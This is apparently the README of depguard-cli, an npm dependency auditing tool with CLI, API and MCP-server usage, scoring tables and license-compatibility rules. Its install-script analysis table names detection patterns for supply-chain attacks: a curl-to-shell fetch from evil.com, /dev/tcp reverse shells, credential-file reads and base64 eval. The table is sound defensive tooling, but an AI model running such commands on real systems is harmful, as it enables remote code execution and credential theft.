# depguard-cli

Audit npm packages for security, maintenance, licenses, and dependencies. Recommends whether to install a package or write from scratch.

Built for AI agents and developers who need to make informed decisions about npm dependencies.

## Install

```bash
npm install -g depguard-cli
```

Or use directly:

```bash
npx depguard-cli audit express
```

## CLI

```bash
# Full audit report
depguard-cli audit <package> [--target-license MIT] [--json]

# Search npm for packages
depguard-cli search <keywords...> [--limit 10] [--json]

# Score a package 0-100
depguard-cli score <package> [--target-license MIT] [--json]

# Get install/write recommendation
depguard-cli should-use <intent...> [--threshold 60] [--json]
```

### Examples

```bash
# Audit express for an Apache-2.0 project
depguard-cli audit express --target-license Apache-2.0

# Find date formatting libraries
depguard-cli search date formatting --limit 5

# Score a package
depguard-cli score lodash --json

# Should I install or write my own?
depguard-cli should-use "http client" --threshold 70
```

## API

```typescript
import { audit, search, score, shouldUse } from 'depguard-cli'

// Full audit report
const report = await audit('express', 'MIT')
console.log(report.vulnerabilities.total)      // 0
console.log(report.licenseCompatibility.compatible) // true
console.log(report.weeklyDownloads)            // 35000000

// Search packages
const results = await search('date formatting', { limit: 5 })
results.forEach(r => console.log(`${r.score}/100 ${r.name}`))

// Score 0-100
const result = await score('lodash', { targetLicense: 'MIT' })
console.log(result.total)       // 82
console.log(result.breakdown)   // { security: 100, maintenance: 75, ... }

// Install or write from scratch?
const rec = await shouldUse('http client')
console.log(rec.action)     // "install"
console.log(rec.package)    // "axios"
console.log(rec.reasoning)  // "axios scores 85/100 (≥60) — safe to install"
```

## Scoring

Each package is scored 0-100 across five dimensions:

| Dimension | Weight | What it measures |
|-----------|--------|------------------|
| Security | 30% | Known CVEs and advisories |
| Maintenance | 25% | Last publish date, version count, deprecation |
| Popularity | 20% | Weekly downloads (log scale) |
| License | 15% | Compatibility with your project license |
| Dependencies | 10% | Dependency count, install scripts |

Weights are configurable via the `weights` option in `score()`.

### Decision thresholds (`shouldUse`)

| Score | Action |
|-------|--------|
| >= 60 | `install` — safe to use |
| 40-59 | `caution` — review before using |
| < 40 | `write-from-scratch` — better to write your own |

The threshold is configurable via `--threshold` (CLI) or `threshold` option (API).

## Token Savings

Every MCP tool response includes a `tokenSavings` field that shows how many LLM tokens you save compared to manual research (web searches, page fetches, reasoning).

```json
"tokenSavings": {
  "responseTokens": 47,
  "manualEstimate": 11100,
  "saved": 11053,
  "percentSaved": 100,
  "manualSteps": [
    "WebSearch: \"{package} npm quality maintenance\" (~800 tokens)",
    "WebFetch: npm registry page (~3000 tokens)",
    "WebFetch: GitHub repo for activity/stars (~3000 tokens)",
    "WebSearch: \"{package} vulnerabilities\" (~800 tokens)",
    "WebFetch: advisories page (~3000 tokens)",
    "Reasoning: compute weighted score (~500 tokens)"
  ]
}
```

This is automatically included in every response — no configuration needed. It helps teams quantify the cost savings of using depguard in their AI workflows.

## MCP Server

depguard includes a built-in [MCP](https://modelcontextprotocol.io/) (Model Context Protocol) server for AI agent integration. It works with **any MCP-compatible client**.

### Compatible AI clients

| Client | Configuration |
|--------|--------------|
| Claude Code | `.mcp.json` or `~/.claude/settings.json` |
| Claude Desktop | `claude_desktop_config.json` |
| Cursor | MCP settings in IDE |
| Windsurf | MCP settings in IDE |
| Continue.dev | `config.json` MCP section |
| Cline / Roo Code | MCP settings |

### Setup

Using npx (no install needed):

```json
{
  "mcpServers": {
    "depguard": {
      "command": "npx",
      "args": ["-y", "depguard-cli", "--mcp"]
    }
  }
}
```

Or if installed globally:

```json
{
  "mcpServers": {
    "depguard": {
      "command": "depguard-cli",
      "args": ["--mcp"]
    }
  }
}
```

Or via Claude Code CLI:

```bash
claude mcp add --transport stdio depguard -- npx -y depguard-cli --mcp
```

### Available tools

| Tool | Description |
|------|-------------|
| `depguard_audit` | Full security audit of an npm package |
| `depguard_audit_bulk` | Audit multiple packages in a single call |
| `depguard_search` | Search npm for packages by keywords |
| `depguard_score` | Score a package 0-100 |
| `depguard_should_use` | Recommend install vs write-from-scratch |

### Bulk audit

Audit all project dependencies in a single call. Accepts a list of package names or a dependencies object directly from `package.json`:

```typescript
// Via API
import { auditBulk } from 'depguard-cli'

const report = await auditBulk(['react', 'express', 'lodash'], { targetLicense: 'MIT' })
console.log(report.total)       // 3
console.log(report.vulnerable)  // 2
console.log(report.summary)     // { critical: 0, high: 2, moderate: 5, low: 3 }
```

Via MCP, the AI agent can pass the dependencies object from `package.json` directly — no need to extract package names manually.

## Install Script Analysis

depguard statically analyzes install scripts (`preinstall`, `install`, `postinstall`) for suspicious patterns commonly used in supply chain attacks:

| Pattern | Severity | Example |
|---------|----------|---------|
| Remote code execution | Critical | `curl evil.com/payload.sh \| sh` |
| Reverse shells | Critical | `/dev/tcp/` connections |
| Credential file access | Critical | Reading `~/.ssh/id_rsa`, `~/.npmrc`, `~/.aws` |
| Sensitive env vars | Critical | Accessing `$NPM_TOKEN`, `$AWS_SECRET` |
| Shell typosquatting | Critical | `/bin/ssh` instead of `/bin/sh` |
| Obfuscated code | High | `eval(Buffer.from(..., "base64"))` |
| Process spawning | High | `child_process`, `exec()`, `spawn()` |
| Environment access | High | `process.env` usage |
| External network calls | Moderate | HTTP requests to non-standard hosts |

Each audit report includes a `scriptAnalysis` field with `suspicious` (boolean) and `risks` (array of detected patterns with severity and description). No scripts are executed — analysis is purely static pattern matching.

## Data sources

depguard combines two advisory databases for maximum coverage:

| Source | What it catches |
|--------|----------------|
| **npm Registry** | Advisories from `npm audit` |
| **GitHub Advisory Database** | GHSA advisories, often not in npm |

Results are deduplicated and each advisory includes a `source` field (`npm` or `github`).

### Caching

Results are cached in memory (5 min) and on disk at `~/.depguard/cache/` (24h). This means:
- Repeated audits of the same package are instant (no network requests)
- Cache survives process restarts
- Expired entries are cleaned up automatically on startup

## License compatibility

depguard checks license compatibility using a permissive-to-copyleft hierarchy:

```
Public Domain (Unlicense, CC0) → Permissive (MIT, ISC, BSD, Apache-2.0)
  → Weak Copyleft (LGPL, MPL) → Strong Copyleft (GPL) → Network (AGPL)
```

A dependency is compatible if its license is equally or more permissive than your project's target license.

## Design principles

- **Zero runtime dependencies** — only Node.js built-in APIs (`fetch`, `crypto`, `readline`)
- **Never throws on network errors** — returns degraded results with warnings
- **TypeScript strict mode** — full type safety
- **100% offline tests** — all tests use mock fetch
- **Cache-friendly** — 5-minute in-memory TTL to avoid rate limits

## Development

```bash
npm run build    # compile TypeScript
npm run lint     # ESLint (strict)
npm test         # 54 tests (all offline)
npm run check    # build + lint + test + audit
```

## License

Apache-2.0 — see [LICENSE](LICENSE) for details.
